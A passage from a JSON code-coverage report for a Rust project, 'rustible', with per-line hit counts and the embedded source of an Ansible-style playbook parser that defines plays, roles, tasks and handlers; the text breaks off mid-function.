":491,"address":[32607691,32608736,32607735,32608758],"length":1,"stats":{"Line":0}},{"line":493,"address":[32607941,32607872],"length":1,"stats":{"Line":0}},{"line":494,"address":[32608699,32607948,32608672],"length":1,"stats":{"Line":0}},{"line":496,"address":[32608029],"length":1,"stats":{"Line":0}},{"line":500,"address":[32608122,32609008,32607640,32609061],"length":1,"stats":{"Line":0}},{"line":501,"address":[32608152],"length":1,"stats":{"Line":0}},{"line":505,"address":[32609293,32609151,32609104,32609250,32609522,32609314,32609335,32610825,32609371],"length":1,"stats":{"Line":0}},{"line":507,"address":[32609221,32609429,32609556,32609280],"length":1,"stats":{"Line":0}},{"line":508,"address":[32609773,32609844],"length":1,"stats":{"Line":0}},{"line":509,"address":[32609882],"length":1,"stats":{"Line":0}},{"line":512,"address":[32609942,32610022],"length":1,"stats":{"Line":0}},{"line":513,"address":[32610056],"length":1,"stats":{"Line":0}},{"line":516,"address":[32610028,32610080,32610382],"length":1,"stats":{"Line":0}},{"line":518,"address":[26288727],"length":1,"stats":{"Line":0}},{"line":520,"address":[32611096,32611267,32612058,32611212],"length":1,"stats":{"Line":0}},{"line":521,"address":[32612319,32612130],"length":1,"stats":{"Line":0}},{"line":522,"address":[32612412,32612478,32612773],"length":1,"stats":{"Line":0}},{"line":526,"address":[32612751],"length":1,"stats":{"Line":0}},{"line":527,"address":[32613034],"length":1,"stats":{"Line":0}},{"line":528,"address":[32613109],"length":1,"stats":{"Line":0}},{"line":529,"address":[32613177],"length":1,"stats":{"Line":0}},{"line":530,"address":[32613240],"length":1,"stats":{"Line":0}},{"line":533,"address":[32613326],"length":1,"stats":{"Line":0}},{"line":539,"address":[32613431],"length":1,"stats":{"Line":0}},{"line":546,"address":[26288746],"length":1,"stats":{"Line":0}},{"line":547,"address":[32614384,32614319],"length":1,"stats":{"Line":0}},{"line":551,"address":[32609343,32611332,32614421,32611362,32611629],"length":1,"stats":{"Line":0}},{"line":553,"address":[32614744,32612440],"length":1,"stats":{"Line":0}},{"line":557,"address":[32612179],"length":1,"stats":{"Line":0}},{"line":561,"address":[25327200,25327218],"length":1,"stats":{"Line":0}},{"line":562,"address":[32615863,32615644,32615687,32615754],"length":1,"stats":{"Line":0}},{"line":563,"address":[32616044,32616101],"length":1,"stats":{"Line":0}},{"line":564,"address":[32616152,32616422],"length":1,"stats":{"Line":0}},{"line":568,"address":[25327104],"length":1,"stats":{"Line":0}},{"line":569,"address":[25327109],"length":1,"stats":{"Line":0}},{"line":573,"address":[25328384],"length":1,"stats":{"Line":0}},{"line":574,"address":[25328389],"length":1,"stats":{"Line":0}},{"line":578,"address":[25327360],"length":1,"stats":{"Line":0}},{"line":579,"address":[25327390],"length":1,"stats":{"Line":0}},{"line":580,"address":[25327405,25327453],"length":1,"stats":{"Line":0}},{"line":581,"address":[25327521],"length":1,"stats":{"Line":0}},{"line":583,"address":[25327542],"length":1,"stats":{"Line":0}},{"line":588,"address":[25323696],"length":1,"stats":{"Line":0}},{"line":589,"address":[25323720],"length":1,"stats":{"Line":0}},{"line":591,"address":[25323760,25323985,25324018],"length":1,"stats":{"Line":0}},{"line":592,"address":[25324014,25324020,25323950],"length":1,"stats":{"Line":0}},{"line":594,"address":[25323982,25323987,25323923],"length":1,"stats":{"Line":0}},{"line":597,"address":[25324043,25323783],"length":1,"stats":{"Line":0}},{"line":598,"address":[25324072,25323818],"length":1,"stats":{"Line":0}},{"line":599,"address":[25324101,25323853],"length":1,"stats":{"Line":0}},{"line":600,"address":[25323888,25324130],"length":1,"stats":{"Line":0}},{"line":610,"address":[25325488],"length":1,"stats":{"Line":1}},{"line":612,"address":[25325502],"length":1,"stats":{"Line":1}},{"line":617,"address":[25324480],"length":1,"stats":{"Line":1}},{"line":619,"address":[25324542],"length":1,"stats":{"Line":1}},{"line":621,"address":[25324598],"length":1,"stats":{"Line":1}},{"line":623,"address":[25324635],"length":1,"stats":{"Line":1}},{"line":627,"address":[25324704,25325458,25325464],"length":1,"stats":{"Line":1}},{"line":628,"address":[25324734],"length":1,"stats":{"Line":1}},{"line":629,"address":[25324766],"length":1,"stats":{"Line":1}},{"line":630,"address":[25324811],"length":1,"stats":{"Line":1}},{"line":632,"address":[25324948,25324884],"length":1,"stats":{"Line":2}},{"line":633,"address":[25325066,25325201],"length":1,"stats":{"Line":2}},{"line":634,"address":[25325216],"length":1,"stats":{"Line":1}},{"line":639,"address":[25325091],"length":1,"stats":{"Line":1}},{"line":642,"address":[25325552],"length":1,"stats":{"Line":1}},{"line":649,"address":[25325671],"length":1,"stats":{"Line":1}},{"line":650,"address":[25325722],"length":1,"stats":{"Line":1}},{"line":653,"address":[25325696],"length":1,"stats":{"Line":1}},{"line":654,"address":[25325833],"length":1,"stats":{"Line":1}},{"line":656,"address":[25325881,25325944],"length":1,"stats":{"Line":2}},{"line":657,"address":[25326095,25325960],"length":1,"stats":{"Line":2}},{"line":658,"address":[25326168],"length":1,"stats":{"Line":1}},{"line":662,"address":[25325999],"length":1,"stats":{"Line":1}},{"line":663,"address":[25326014],"length":1,"stats":{"Line":1}},{"line":664,"address":[25326057],"length":1,"stats":{"Line":1}},{"line":667,"address":[25325932],"length":1,"stats":{"Line":1}},{"line":672,"address":[25323616],"length":1,"stats":{"Line":0}},{"line":673,"address":[25323624],"length":1,"stats":{"Line":0}}],"covered":32,"coverable":248},{"path":["/","home","artur","Repositories","rustible","src","executor","playbook.rs"],"content":"//! Playbook runner for Rustible\n//!\n//! This module provides:\n//! - Play execution\n//! - Role inclusion\n//! - Import/include task files\n\nuse std::path::{Path, PathBuf};\n\nuse indexmap::IndexMap;\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\nuse tracing::debug;\n\nuse crate::executor::task::{Handler, Task};\nuse crate::executor::{ExecutorError, ExecutorResult};\n\n/// A complete playbook containing multiple plays\n#[derive(Debug, Clone, Default)]\npub struct Playbook {\n    /// Name of the playbook\n    pub name: String,\n    /// Path to the playbook file\n    pub path: Option\u003cPathBuf\u003e,\n    /// Global variables for the playbook\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Var files to include\n    pub vars_files: Vec\u003cString\u003e,\n    /// Plays in this playbook\n    pub plays: Vec\u003cPlay\u003e,\n}\n\nimpl Playbook {\n    /// Create a new empty playbook\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            ..Default::default()\n        }\n    }\n\n    /// Load a playbook from a YAML file\n    pub fn load\u003cP: AsRef\u003cPath\u003e\u003e(path: P) -\u003e ExecutorResult\u003cSelf\u003e {\n        let path = path.as_ref();\n        let content = std::fs::read_to_string(path).map_err(|e| ExecutorError::IoError(e))?;\n\n        Self::parse(\u0026content, Some(path.to_path_buf()))\n    }\n\n    /// Parse a playbook from YAML content\n    pub fn parse(content: \u0026str, path: Option\u003cPathBuf\u003e) -\u003e ExecutorResult\u003cSelf\u003e {\n        // Ansible playbooks are arrays of plays at the top level\n        let plays: Vec\u003cPlayDefinition\u003e = serde_yaml::from_str(content)\n            .map_err(|e| ExecutorError::ParseError(format!(\"YAML parse error: {}\", e)))?;\n\n        let mut playbook = Playbook::default();\n        playbook.path = path.clone();\n\n        if let Some(ref p) = path {\n            playbook.name = p\n                .file_stem()\n                .and_then(|s| s.to_str())\n                .unwrap_or(\"Untitled\")\n                .to_string();\n        }\n\n        for play_def in plays {\n            let play = Play::from_definition(play_def, path.as_ref())?;\n            playbook.plays.push(play);\n        }\n\n        Ok(playbook)\n    }\n\n    /// Add a play to the playbook\n    pub fn add_play(\u0026mut self, play: Play) {\n        self.plays.push(play);\n    }\n\n    /// Set a variable\n    pub fn set_var(\u0026mut self, name: impl Into\u003cString\u003e, value: JsonValue) {\n        self.vars.insert(name.into(), value);\n    }\n\n    /// Get the playbook directory\n    pub fn get_playbook_dir(\u0026self) -\u003e Option\u003cPathBuf\u003e {\n        self.path\n            .as_ref()\n            .and_then(|p| p.parent().map(PathBuf::from))\n    }\n}\n\n/// Raw play definition from YAML\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct PlayDefinition {\n    /// Play name\n    #[serde(default)]\n    pub name: String,\n    /// Target hosts pattern\n    #[serde(default = \"default_hosts\")]\n    pub hosts: String,\n    /// Gather facts\n    #[serde(default = \"default_gather_facts\")]\n    pub gather_facts: bool,\n    /// Become root\n    #[serde(default)]\n    pub r#become: bool,\n    /// User to become\n    #[serde(default)]\n    pub become_user: Option\u003cString\u003e,\n    /// Become method\n    #[serde(default)]\n    pub become_method: Option\u003cString\u003e,\n    /// Connection type\n    #[serde(default)]\n    pub connection: Option\u003cString\u003e,\n    /// Remote user\n    #[serde(default)]\n    pub remote_user: Option\u003cString\u003e,\n    /// Play variables\n    #[serde(default)]\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Variable files to include\n    #[serde(default)]\n    pub vars_files: Vec\u003cString\u003e,\n    /// Roles to include\n    #[serde(default)]\n    pub roles: Vec\u003cRoleDefinition\u003e,\n    /// Pre-tasks (run before roles)\n    #[serde(default)]\n    pub pre_tasks: Vec\u003cTaskDefinition\u003e,\n    /// Main tasks\n    #[serde(default)]\n    pub tasks: Vec\u003cTaskDefinition\u003e,\n    /// Post-tasks (run after roles)\n    #[serde(default)]\n    pub post_tasks: Vec\u003cTaskDefinition\u003e,\n    /// Handlers\n    #[serde(default)]\n    pub handlers: Vec\u003cHandlerDefinition\u003e,\n    /// Environment variables\n    #[serde(default)]\n    pub environment: IndexMap\u003cString, JsonValue\u003e,\n    /// Tags for this play\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n    /// Serial execution (number of hosts at a time)\n    #[serde(default)]\n    pub serial: Option\u003cSerialValue\u003e,\n    /// Maximum failure percentage\n    #[serde(default)]\n    pub max_fail_percentage: Option\u003cu8\u003e,\n    /// Strategy override\n    #[serde(default)]\n    pub strategy: Option\u003cString\u003e,\n    /// Ignore unreachable hosts\n    #[serde(default)]\n    pub ignore_unreachable: bool,\n    /// Fact gathering subset\n    #[serde(default)]\n    pub gather_subset: Vec\u003cString\u003e,\n    /// Order of host execution\n    #[serde(default)]\n    pub order: Option\u003cString\u003e,\n    /// Module defaults\n    #[serde(default)]\n    pub module_defaults: IndexMap\u003cString, IndexMap\u003cString, JsonValue\u003e\u003e,\n}\n\nfn default_hosts() -\u003e String {\n    \"all\".to_string()\n}\n\nfn default_gather_facts() -\u003e bool {\n    true\n}\n\n/// Serial value can be a number, percentage, or list\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum SerialValue {\n    Number(usize),\n    Percentage(String),\n    List(Vec\u003cSerialValue\u003e),\n}\n\n/// Role definition in a play\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum RoleDefinition {\n    /// Simple role name\n    Name(String),\n    /// Role with parameters\n    Full {\n        /// Role name or path\n        #[serde(alias = \"name\")]\n        role: String,\n        /// When condition\n        #[serde(default)]\n        when: Option\u003cString\u003e,\n        /// Tags\n        #[serde(default)]\n        tags: Vec\u003cString\u003e,\n        /// Role variables\n        #[serde(default)]\n        vars: IndexMap\u003cString, JsonValue\u003e,\n        /// Become override\n        #[serde(default)]\n        r#become: Option\u003cbool\u003e,\n        /// Task include options\n        #[serde(default)]\n        tasks_from: Option\u003cString\u003e,\n        #[serde(default)]\n        vars_from: Option\u003cString\u003e,\n        #[serde(default)]\n        defaults_from: Option\u003cString\u003e,\n        #[serde(default)]\n        handlers_from: Option\u003cString\u003e,\n    },\n}\n\nimpl RoleDefinition {\n    /// Get the role name\n    pub fn name(\u0026self) -\u003e \u0026str {\n        match self {\n            RoleDefinition::Name(name) =\u003e name,\n            RoleDefinition::Full { role, .. } =\u003e role,\n        }\n    }\n\n    /// Get role variables\n    pub fn vars(\u0026self) -\u003e IndexMap\u003cString, JsonValue\u003e {\n        match self {\n            RoleDefinition::Name(_) =\u003e IndexMap::new(),\n            RoleDefinition::Full { vars, .. } =\u003e vars.clone(),\n        }\n    }\n\n    /// Get when condition\n    pub fn when(\u0026self) -\u003e Option\u003c\u0026str\u003e {\n        match self {\n            RoleDefinition::Name(_) =\u003e None,\n            RoleDefinition::Full { when, .. } =\u003e when.as_deref(),\n        }\n    }\n}\n\n/// Task definition from YAML\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct TaskDefinition {\n    /// Task name\n    #[serde(default)]\n    pub name: String,\n    /// When condition\n    #[serde(default)]\n    pub when: Option\u003cWhenCondition\u003e,\n    /// Register result\n    #[serde(default)]\n    pub register: Option\u003cString\u003e,\n    /// Notify handlers\n    #[serde(default)]\n    pub notify: NotifyValue,\n    /// Loop items\n    #[serde(default, alias = \"with_items\", alias = \"with_list\")]\n    pub loop_items: Option\u003cLoopValue\u003e,\n    /// Loop control\n    #[serde(default)]\n    pub loop_control: Option\u003cLoopControl\u003e,\n    /// Ignore errors\n    #[serde(default)]\n    pub ignore_errors: bool,\n    /// Changed when condition\n    #[serde(default)]\n    pub changed_when: Option\u003cWhenCondition\u003e,\n    /// Failed when condition\n    #[serde(default)]\n    pub failed_when: Option\u003cWhenCondition\u003e,\n    /// Delegate to host\n    #[serde(default)]\n    pub delegate_to: Option\u003cString\u003e,\n    /// Run once\n    #[serde(default)]\n    pub run_once: bool,\n    /// Tags\n    #[serde(default)]\n    pub tags: Vec\u003cString\u003e,\n    /// Become\n    #[serde(default)]\n    pub r#become: bool,\n    /// Become user\n    #[serde(default)]\n    pub become_user: Option\u003cString\u003e,\n    /// Block of tasks\n    #[serde(default)]\n    pub block: Option\u003cVec\u003cTaskDefinition\u003e\u003e,\n    /// Rescue tasks (run if block fails)\n    #[serde(default)]\n    pub rescue: Option\u003cVec\u003cTaskDefinition\u003e\u003e,\n    /// Always tasks (run regardless)\n    #[serde(default)]\n    pub always: Option\u003cVec\u003cTaskDefinition\u003e\u003e,\n    /// Include tasks file\n    #[serde(default)]\n    pub include_tasks: Option\u003cString\u003e,\n    /// Import tasks file\n    #[serde(default)]\n    pub import_tasks: Option\u003cString\u003e,\n    /// Include role\n    #[serde(default)]\n    pub include_role: Option\u003cIncludeRoleDefinition\u003e,\n    /// Import role\n    #[serde(default)]\n    pub import_role: Option\u003cIncludeRoleDefinition\u003e,\n    /// Task arguments (module-specific)\n    #[serde(default, alias = \"args\")]\n    pub module_args: Option\u003cIndexMap\u003cString, JsonValue\u003e\u003e,\n    /// Environment variables\n    #[serde(default)]\n    pub environment: IndexMap\u003cString, JsonValue\u003e,\n    /// Retries\n    #[serde(default)]\n    pub retries: Option\u003cusize\u003e,\n    /// Delay between retries\n    #[serde(default)]\n    pub delay: Option\u003cusize\u003e,\n    /// Until condition for retries\n    #[serde(default)]\n    pub until: Option\u003cWhenCondition\u003e,\n    /// Module name and args (catch-all for module: args format)\n    #[serde(flatten)]\n    pub module: IndexMap\u003cString, JsonValue\u003e,\n}\n\n/// Include/Import role definition\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct IncludeRoleDefinition {\n    pub name: String,\n    #[serde(default)]\n    pub tasks_from: Option\u003cString\u003e,\n    #[serde(default)]\n    pub vars_from: Option\u003cString\u003e,\n    #[serde(default)]\n    pub defaults_from: Option\u003cString\u003e,\n    #[serde(default)]\n    pub handlers_from: Option\u003cString\u003e,\n    #[serde(default)]\n    pub public: bool,\n    #[serde(default)]\n    pub allow_duplicates: bool,\n}\n\n/// When condition can be a string or list\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum WhenCondition {\n    Single(String),\n    List(Vec\u003cString\u003e),\n}\n\nimpl WhenCondition {\n    /// Convert to a single condition string (AND-joined if list)\n    pub fn to_condition(\u0026self) -\u003e String {\n        match self {\n            WhenCondition::Single(s) =\u003e s.clone(),\n            WhenCondition::List(list) =\u003e {\n                if list.len() == 1 {\n                    list[0].clone()\n                } else {\n                    list.iter()\n                        .map(|s| format!(\"({})\", s))\n                        .collect::\u003cVec\u003c_\u003e\u003e()\n                        .join(\" and \")\n                }\n            }\n        }\n    }\n}\n\n/// Notify value can be a string or list\n#[derive(Debug, Clone, Serialize, Deserialize, Default)]\n#[serde(untagged)]\npub enum NotifyValue {\n    #[default]\n    None,\n    Single(String),\n    List(Vec\u003cString\u003e),\n}\n\nimpl NotifyValue {\n    pub fn to_vec(\u0026self) -\u003e Vec\u003cString\u003e {\n        match self {\n            NotifyValue::None =\u003e vec![],\n            NotifyValue::Single(s) =\u003e vec![s.clone()],\n            NotifyValue::List(list) =\u003e list.clone(),\n        }\n    }\n}\n\n/// Loop value can be various types\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(untagged)]\npub enum LoopValue {\n    Items(Vec\u003cJsonValue\u003e),\n    Variable(String),\n}\n\n/// Loop control options\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct LoopControl {\n    #[serde(default = \"default_loop_var\")]\n    pub loop_var: String,\n    #[serde(default)]\n    pub index_var: Option\u003cString\u003e,\n    #[serde(default)]\n    pub label: Option\u003cString\u003e,\n    #[serde(default)]\n    pub pause: Option\u003cf64\u003e,\n    #[serde(default)]\n    pub extended: bool,\n}\n\nfn default_loop_var() -\u003e String {\n    \"item\".to_string()\n}\n\n/// Handler definition from YAML\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct HandlerDefinition {\n    /// Handler name\n    pub name: String,\n    /// Listen for additional notification names\n    #[serde(default)]\n    pub listen: Vec\u003cString\u003e,\n    /// When condition\n    #[serde(default)]\n    pub when: Option\u003cWhenCondition\u003e,\n    /// Module name and args\n    #[serde(flatten)]\n    pub module: IndexMap\u003cString, JsonValue\u003e,\n}\n\n/// A play within a playbook\n#[derive(Debug, Clone)]\npub struct Play {\n    /// Play name\n    pub name: String,\n    /// Target hosts pattern\n    pub hosts: String,\n    /// Whether to gather facts\n    pub gather_facts: bool,\n    /// Become root\n    pub r#become: bool,\n    /// User to become\n    pub become_user: Option\u003cString\u003e,\n    /// Connection type\n    pub connection: Option\u003cString\u003e,\n    /// Remote user\n    pub remote_user: Option\u003cString\u003e,\n    /// Play variables\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Variable files to include\n    pub vars_files: Vec\u003cString\u003e,\n    /// Roles to execute\n    pub roles: Vec\u003cRole\u003e,\n    /// Pre-tasks\n    pub pre_tasks: Vec\u003cTask\u003e,\n    /// Main tasks\n    pub tasks: Vec\u003cTask\u003e,\n    /// Post-tasks\n    pub post_tasks: Vec\u003cTask\u003e,\n    /// Handlers\n    pub handlers: Vec\u003cHandler\u003e,\n    /// Environment variables\n    pub environment: IndexMap\u003cString, JsonValue\u003e,\n    /// Tags\n    pub tags: Vec\u003cString\u003e,\n    /// Serial execution\n    pub serial: Option\u003cusize\u003e,\n    /// Max failure percentage\n    pub max_fail_percentage: Option\u003cu8\u003e,\n    /// Strategy\n    pub strategy: Option\u003cString\u003e,\n    /// Ignore unreachable hosts\n    pub ignore_unreachable: bool,\n}\n\nimpl Play {\n    /// Create a new play\n    pub fn new(name: impl Into\u003cString\u003e, hosts: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            hosts: hosts.into(),\n            gather_facts: true,\n            r#become: false,\n            become_user: None,\n            connection: None,\n            remote_user: None,\n            vars: IndexMap::new(),\n            vars_files: Vec::new(),\n            roles: Vec::new(),\n            pre_tasks: Vec::new(),\n            tasks: Vec::new(),\n            post_tasks: Vec::new(),\n            handlers: Vec::new(),\n            environment: IndexMap::new(),\n            tags: Vec::new(),\n            serial: None,\n            max_fail_percentage: None,\n            strategy: None,\n            ignore_unreachable: false,\n        }\n    }\n\n    /// Create a Play from a PlayDefinition\n    pub fn from_definition(\n        def: PlayDefinition,\n        playbook_path: Option\u003c\u0026PathBuf\u003e,\n    ) -\u003e ExecutorResult\u003cSelf\u003e {\n        let mut play = Play::new(\u0026def.name, \u0026def.hosts);\n\n        play.gather_facts = def.gather_facts;\n        play.r#become = def.r#become;\n        play.r#become_user = def.r#become_user;\n        play.connection = def.connection;\n        play.remote_user = def.remote_user;\n        play.vars = def.vars;\n        play.vars_files = def.vars_files;\n        play.environment = def.environment;\n        play.tags = def.tags;\n        play.strategy = def.strategy;\n        play.ignore_unreachable = def.ignore_unreachable;\n        play.max_fail_percentage = def.max_fail_percentage;\n\n        // Parse serial value\n        if let Some(serial) = def.serial {\n            play.serial = match serial {\n                SerialValue::Number(n) =\u003e Some(n),\n                SerialValue::Percentage(p) =\u003e {\n                    // Parse percentage like \"50%\" - for now just treat as a fixed number\n                    p.trim_end_matches('%').parse::\u003cusize\u003e().ok()\n                }\n                SerialValue::List(list) =\u003e {\n                    // Use first value for simplicity\n                    list.first().and_then(|v| match v {\n                        SerialValue::Number(n) =\u003e Some(*n),\n                        _ =\u003e None,\n                    })\n                }\n            };\n        }\n\n        // Parse roles\n        for role_def in def.roles {\n            let role = Role::from_definition(role_def, playbook_path)?;\n            play.roles.push(role);\n        }\n\n        // Parse pre_tasks\n        for task_def in def.pre_tasks {\n            let tasks = parse_task_definition(task_def, playbook_path)?;\n            play.pre_tasks.extend(tasks);\n        }\n\n        // Parse tasks\n        for task_def in def.tasks {\n            let tasks = parse_task_definition(task_def, playbook_path)?;\n            play.tasks.extend(tasks);\n        }\n\n        // Parse post_tasks\n        for task_def in def.post_tasks {\n            let tasks = parse_task_definition(task_def, playbook_path)?;\n            play.post_tasks.extend(tasks);\n        }\n\n        // Parse handlers\n        for handler_def in def.handlers {\n            let handler = parse_handler_definition(handler_def)?;\n            play.handlers.push(handler);\n        }\n\n        Ok(play)\n    }\n\n    /// Add a task to the play\n    pub fn add_task(\u0026mut self, task: Task) {\n        self.tasks.push(task);\n    }\n\n    /// Add a handler to the play\n    pub fn add_handler(\u0026mut self, handler: Handler) {\n        self.handlers.push(handler);\n    }\n\n    /// Set a variable\n    pub fn set_var(\u0026mut self, name: impl Into\u003cString\u003e, value: JsonValue) {\n        self.vars.insert(name.into(), value);\n    }\n}\n\n/// A role to be executed\n#[derive(Debug, Clone)]\npub struct Role {\n    /// Role name\n    pub name: String,\n    /// Role path\n    pub path: Option\u003cPathBuf\u003e,\n    /// Role variables\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// When condition\n    pub when: Option\u003cString\u003e,\n    /// Tags\n    pub tags: Vec\u003cString\u003e,\n    /// Become override\n    pub r#become: Option\u003cbool\u003e,\n    /// Default variables\n    pub defaults: IndexMap\u003cString, JsonValue\u003e,\n    /// Tasks from role\n    pub tasks: Vec\u003cTask\u003e,\n    /// Handlers from role\n    pub handlers: Vec\u003cHandler\u003e,\n    /// Files included by tasks_from\n    pub tasks_from: Option\u003cString\u003e,\n    /// Dependencies\n    pub dependencies: Vec\u003cRole\u003e,\n}\n\nimpl Role {\n    /// Create a new role\n    pub fn new(name: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            name: name.into(),\n            path: None,\n            vars: IndexMap::new(),\n            when: None,\n            tags: Vec::new(),\n            r#become: None,\n            defaults: IndexMap::new(),\n            tasks: Vec::new(),\n            handlers: Vec::new(),\n            tasks_from: None,\n            dependencies: Vec::new(),\n        }\n    }\n\n    /// Create a Role from a RoleDefinition\n    pub fn from_definition(\n        def: RoleDefinition,\n        playbook_path: Option\u003c\u0026PathBuf\u003e,\n    ) -\u003e ExecutorResult\u003cSelf\u003e {\n        let mut role = Role::new(def.name());\n        role.vars = def.vars();\n        role.when = def.when().map(String::from);\n\n        if let RoleDefinition::Full {\n            tags,\n            r#become: become_opt,\n            tasks_from,\n            ..\n        } = \u0026def\n        {\n            role.tags = tags.clone();\n            role.r#become = *become_opt;\n            role.tasks_from = tasks_from.clone();\n        }\n\n        // In a full implementation, we would load the role from disk here\n        // Looking in: ./roles/\u003cname\u003e, ~/.ansible/roles/\u003cname\u003e, /etc/ansible/roles/\u003cname\u003e\n\n        if let Some(playbook_path) = playbook_path {\n            let playbook_dir = playbook_path.parent().unwrap_or(Path::new(\".\"));\n            let role_path = playbook_dir.join(\"roles\").join(role.name.clone());\n\n            if role_path.exists() {\n                role.path = Some(role_path.clone());\n\n                // Load defaults/main.yml\n                let defaults_file = role_path.join(\"defaults\").join(\"main.yml\");\n                if defaults_file.exists() {\n                    if let Ok(content) = std::fs::read_to_string(\u0026defaults_file) {\n                        if let Ok(defaults) =\n                            serde_yaml::from_str::\u003cIndexMap\u003cString, JsonValue\u003e\u003e(\u0026content)\n                        {\n                            role.defaults = defaults;\n                        }\n                    }\n                }\n\n                // Load tasks/main.yml (or tasks_from if specified)\n                let tasks_file = if let Some(ref tasks_from) = role.tasks_from {\n                    role_path.join(\"tasks\").join(format!(\"{}.yml\", tasks_from))\n                } else {\n                    role_path.join(\"tasks\").join(\"main.yml\")\n                };\n\n                if tasks_file.exists() {\n                    if let Ok(content) = std::fs::read_to_string(\u0026tasks_file) {\n                        if let Ok(task_defs) = serde_yaml::from_str::\u003cVec\u003cTaskDefinition\u003e\u003e(\u0026content)\n                        {\n                            for task_def in task_defs {\n                                if let Ok(tasks) =\n                                    parse_task_definition(task_def, Some(\u0026tasks_file))\n                                {\n                                    role.tasks.extend(tasks);\n                                }\n                            }\n                        }\n                    }\n                }\n\n                // Load handlers/main.yml\n                let handlers_file = role_path.join(\"handlers\").join(\"main.yml\");\n                if handlers_file.exists() {\n                    if let Ok(content) = std::fs::read_to_string(\u0026handlers_file) {\n                        if let Ok(handler_defs) =\n                            serde_yaml::from_str::\u003cVec\u003cHandlerDefinition\u003e\u003e(\u0026content)\n                        {\n                            for handler_def in handler_defs {\n                                if let Ok(handler) = parse_handler_definition(handler_def) {\n                                    role.handlers.push(handler);\n                                }\n                            }\n                        }\n                    }\n                }\n\n                // Load meta/main.yml for dependencies\n                let meta_file = role_path.join(\"meta\").join(\"main.yml\");\n                if meta_file.exists() {\n                    if let Ok(content) = std::fs::read_to_string(\u0026meta_file) {\n                        if let Ok(meta) = serde_yaml::from_str::\u003cRoleMeta\u003e(\u0026content) {\n                            for dep in meta.dependencies {\n                                if let Ok(dep_role) =\n                                    Role::from_definition(dep, Some(playbook_path))\n                                {\n                                    role.dependencies.push(dep_role);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n\n        Ok(role)\n    }\n\n    /// Get all tasks including from dependencies\n    pub fn get_all_tasks(\u0026self) -\u003e Vec\u003cTask\u003e {\n        let mut all_tasks = Vec::new();\n\n        // First, add dependency tasks\n        for dep in \u0026self.dependencies {\n            all_tasks.extend(dep.get_all_tasks());\n        }\n\n        // Then add our tasks\n        all_tasks.extend(self.tasks.clone());\n\n        all_tasks\n    }\n\n    /// Get all handlers including from dependencies\n    pub fn get_all_handlers(\u0026self) -\u003e Vec\u003cHandler\u003e {\n        let mut all_handlers = Vec::new();\n\n        for dep in \u0026self.dependencies {\n            all_handlers.extend(dep.get_all_handlers());\n        }\n\n        all_handlers.extend(self.handlers.clone());\n\n        all_handlers\n    }\n}\n\n/// Role metadata\n#[derive(Debug, Clone, Serialize, Deserialize)]\nstruct RoleMeta {\n    #[serde(default)]\n    dependencies: Vec\u003cRoleDefinition\u003e,\n    #[serde(default)]\n    galaxy_info: Option\u003cGalaxyInfo\u003e,\n    #[serde(default)]\n    allow_duplicates: bool,\n}\n\n#[derive(Debug, Clone, Serialize, Deserialize)]\nstruct GalaxyInfo {\n    role_name: Option\u003cString\u003e,\n    author: Option\u003cString\u003e,\n    description: Option\u003cString\u003e,\n    license: Option\u003cString\u003e,\n    min_ansible_version: Option\u003cString\u003e,\n    platforms: Option\u003cVec\u003cPlatform\u003e\u003e,\n    galaxy_tags: Option\u003cVec\u003cString\u003e\u003e,\n}\n\n#[derive(Debug, Clone, Serialize, Deserialize)]\nstruct Platform {\n    name: String,\n    versions: Option\u003cVec\u003cString\u003e\u003e,\n}\n\n/// Parse a task definition into Task(s)\nfn parse_task_definition(\n    def: TaskDefinition,\n    playbook_path: Option\u003c\u0026PathBuf\u003e,\n) -\u003e ExecutorResult\u003cVec\u003cTask\u003e\u003e {\n    let mut tasks = Vec::new();\n\n    // Handle block/rescue/always\n    if let Some(block_tasks) = def.block {\n        let mut block_parsed = Vec::new();\n        for task_def in block_tasks {\n            block_parsed.extend(parse_task_definition(task_def, playbook_path)?);\n        }\n\n        // Apply block-level properties to all tasks\n        for mut task in block_parsed {\n            if def.r#become {\n                task.r#become = true;\n            }\n            if let Some(ref when) = def.when {\n                if task.when.is_none() {\n                    task.when = Some(when.to_condition());\n                }\n            }\n            tasks.push(task);\n        }\n\n        // Handle rescue tasks\n        if let Some(rescue_tasks) = def.rescue {\n            for task_def in rescue_tasks {\n                let rescue_parsed = parse_task_definition(task_def, playbook_path)?;\n                // Mark these as rescue tasks (in a full implementation)\n                tasks.extend(rescue_parsed);\n            }\n        }\n\n        // Handle always tasks\n        if let Some(always_tasks) = def.always {\n            for task_def in always_tasks {\n                let always_parsed = parse_task_definition(task_def, playbook_path)?;\n                tasks.extend(always_parsed);\n            }\n        }\n\n        return Ok(tasks);\n    }\n\n    // Handle include_tasks\n    if let Some(ref include_file) = def.include_tasks {\n        debug!(\"Would include tasks from: {}\", include_file);\n        // In a full implementation, load and parse the included file\n        let task = Task {\n            name: def.name.clone(),\n            module: \"include_tasks\".to_string(),\n            args: {\n                let mut args = IndexMap::new();\n                args.insert(\"file\".to_string(), JsonValue::String(include_file.clone()));\n                args\n            },\n            when: def.when.as_ref().map(|w| w.to_condition()),\n            ..Default::default()\n        };\n        return Ok(vec![task]);\n    }\n\n    // Handle import_tasks\n    if let Some(ref import_file) = def.import_tasks {\n        debug!(\"Would import tasks from: {}\", import_file);\n        // In a full implementation, load and parse the imported file at parse time\n        let task = Task {\n            name: def.name.clone(),\n            module: \"import_tasks\".to_string(),\n            args: {\n                let mut args = 